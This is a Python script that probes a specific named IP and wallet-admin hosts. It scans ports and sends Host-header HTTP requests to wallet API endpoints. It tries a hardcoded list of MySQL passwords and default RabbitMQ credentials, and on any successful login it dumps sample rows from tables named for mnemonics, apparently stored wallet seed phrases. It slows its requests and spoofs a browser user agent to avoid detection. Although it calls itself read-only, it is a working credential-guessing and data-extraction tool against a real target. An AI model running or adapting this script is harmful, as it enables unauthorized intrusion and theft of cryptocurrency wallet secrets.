#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wallet_origin_probe.py - probe candidate origin IP of walleto.top wallet admin.
Read-only probes: ports, HTTP (Host-header), MySQL auth (SHOW/SELECT only),
Redis INFO, RabbitMQ mgmt overview. Low rate (random 8-15s sleeps).
Usage: python3 wallet_origin_probe.py --ip 182.16.37.53 [--host new.walleto.top]
"""
import argparse, json, random, socket, subprocess, sys, time, urllib.request, ssl

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"

def log(*a):
    print(*a, flush=True)

def pause(lo=8, hi=15):
    time.sleep(random.uniform(lo, hi))

def tcp_open(ip, port, timeout=6):
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except Exception:
        return False

def http_probe(url, host, method="GET", body=None, timeout=20):
    """curl via subprocess (handles TLS easily). Returns (code, head, body_snippet)."""
    cmd = ["curl", "-sk", "--max-time", str(timeout), "-A", UA, "-H", "Host: " + host,
           "-w", "\n[HTTP:%{http_code} len:%{size_download} time:%{time_total}]", "-D", "-"]
    if method == "POST":
        cmd += ["-X", "POST", "-H", "Content-Type: application/json"]
        if body is not None:
            cmd += ["--data", body]
    cmd.append(url)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
        out = r.stdout
    except Exception as e:
        return None, str(e), ""
    # split headers/body
    parts = out.split("\r\n\r\n", 1)
    head = parts[0] if len(parts) > 1 else out
    body = parts[1] if len(parts) > 1 else ""
    tail = out.splitlines()[-1] if out.splitlines() else ""
    return head, tail, body[:400]

def mysql_try(ip, port, user, pwd, timeout=10):
    """Read-only MySQL login attempt. Returns dict or None."""
    try:
        import pymysql
        conn = pymysql.connect(host=ip, port=port, user=user, password=pwd,
                               connect_timeout=timeout, read_timeout=timeout)
        cur = conn.cursor()
        cur.execute("SELECT VERSION()")
        ver = cur.fetchone()
        cur.execute("SHOW DATABASES")
        dbs = [r[0] for r in cur.fetchall()]
        res = {"user": user, "version": ver[0] if ver else "?", "databases": dbs}
        # try to locate wallet schema
        for db in dbs:
            if any(k in db.lower() for k in ("wallet", "smart", "admin", "b_imtoken", "imtoken")):
                try:
                    cur.execute(f"SHOW TABLES FROM `{db}`")
                    tabs = [r[0] for r in cur.fetchall()]
                    res[f"tables:{db}"] = tabs
                    mnem = [t for t in tabs if "mnemonic" in t.lower() or "wallet" in t.lower()]
                    if mnem:
                        res[f"mnemonic_tables:{db}"] = mnem
                        t = mnem[0]
                        try:
                            cur.execute(f"SELECT COUNT(*) FROM `{db}`.`{t}`")
                            res[f"count:{db}.{t}"] = cur.fetchone()[0]
                            cur.execute(f"SELECT * FROM `{db}`.`{t}` LIMIT 2")
                            cols = [d[0] for d in cur.description]
                            rows = cur.fetchall()
                            res[f"sample:{db}.{t}"] = {"cols": cols, "rows": [str(r)[:500] for r in rows]}
                        except Exception as e:
                            res[f"select_err:{db}.{t}"] = str(e)[:200]
                except Exception as e:
                    res[f"tables_err:{db}"] = str(e)[:200]
        conn.close()
        return res
    except ImportError:
        return {"import_error": "pymysql missing"}
    except Exception as e:
        return None  # auth failed / unreachable

def redis_info(ip, port=6379, timeout=6):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.sendall(b"INFO\r\n")
        data = b""
        s.settimeout(timeout)
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n" in data[-8:]:
                    break
        except Exception:
            pass
        s.close()
        txt = data.decode(errors="replace")
        head = "\n".join(txt.splitlines()[:25])
        return txt[:400], head
    except Exception as e:
        return None, str(e)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--ip", default="182.16.37.53")
    ap.add_argument("--hosts", default="new.walleto.top,admin.walleto.top,wallet.008dy.com")
    ap.add_argument("--ports", default="22,80,86,443,3010,3306,4369,5672,6379,6666,15672")
    ap.add_argument("--mysql-creds", default="root:SmartAdmin666,root:vEgLK5N,root:,vEgLK5N:SmartAdmin666,admin:SmartAdmin666,wallet:SmartAdmin666")
    args = ap.parse_args()
    ip = args.ip
    hosts = [h.strip() for h in args.hosts.split(",") if h.strip()]
    ports = [int(p) for p in args.ports.split(",") if p.strip()]

    log(f"== runner_ip: {subprocess.run(['curl','-sk','--max-time','10','https://api.ipify.org'],capture_output=True,text=True).stdout.strip() or 'unknown'}")
    log(f"== target: {ip}")

    log("\n### 1. TCP port probe")
    open_ports = []
    for p in ports:
        ok = tcp_open(ip, p)
        log(f"port {p}: {'OPEN' if ok else 'closed/filtered'}")
        if ok:
            open_ports.append(p)
        pause(3, 7)

    log("\n### 2. HTTP probes (Host header)")
    for h in hosts:
        for scheme_port in ("https:443", "http:80"):
            scheme, port = scheme_port.split(":")
            url = f"{scheme}://{ip}/"
            head, tail, body = http_probe(url, h)
            log(f"--- {scheme}://{ip}/  Host:{h} ---")
            if head is None:
                log("  ERR:", tail)
                continue
            first = "\n".join(head.splitlines()[:8])
            log("  " + first.replace("\n", "\n  "))
            log("  " + tail)
            if body.strip():
                log("  body: " + body.replace("\n", " ")[:250])
            pause()
    # API endpoints on the wallet host
    h = hosts[0]
    for path, m, b in [
        ("/api/v3/api-docs", "GET", None),
        ("/api/actuator/health", "GET", None),
        ("/api/login/getCaptcha", "GET", None),
        ("/api/login", "POST", "{}"),
        ("/api/walletMnemonic/queryPage", "POST", '{"pageNum":1,"pageSize":5}'),
    ]:
        url = f"https://{ip}{path}"
        head, tail, body = http_probe(url, h, m, b)
        log(f"--- {m} https://{ip}{path} Host:{h} ---")
        if head is None:
            log("  ERR:", tail)
            continue
        first = "\n".join(head.splitlines()[:8])
        log("  " + first.replace("\n", "\n  "))
        log("  " + tail)
        if body.strip():
            log("  body: " + body.replace("\n", " ")[:300])
        pause()

    log("\n### 3. MySQL auth (read-only)")
    for cp in [3306, 6666]:
        if cp not in open_ports:
            log(f"port {cp} not open, skip")
            continue
        for cred in args.mysql_creds.split(","):
            u, _, p = cred.partition(":")
            log(f"--- mysql {ip}:{cp} user={u} pwd={'<empty>' if p=='' else p} ---")
            res = mysql_try(ip, cp, u, p)
            if res is None:
                log("  AUTH FAILED / unreachable")
            else:
                log("  *** AUTH OK ***")
                log("  " + json.dumps(res, ensure_ascii=False)[:2000])
            pause()

    log("\n### 4. Redis 6379")
    if 6379 in open_ports:
        full, head = redis_info(ip)
        if full:
            log("  REDIS RESPONSE HEAD:")
            log("  " + head.replace("\n", "\n  ")[:800])
        else:
            log("  redis err:", head)
    else:
        log("  port 6379 not open, skip")

    log("\n### 5. RabbitMQ 15672 guest/guest")
    if 15672 in open_ports:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(f"http://{ip}:15672/api/overview")
            import base64
            req.add_header("Authorization", "Basic " + base64.b64encode(b"guest:guest").decode())
            with urllib.request.urlopen(req, timeout=15) as r:
                data = r.read(800).decode(errors="replace")
                log(f"  HTTP {r.status}: {data[:600]}")
        except Exception as e:
            log("  rabbit err:", str(e)[:200])
    else:
        log("  port 15672 not open, skip")

    log("\nDONE")

if __name__ == "__main__":
    main()
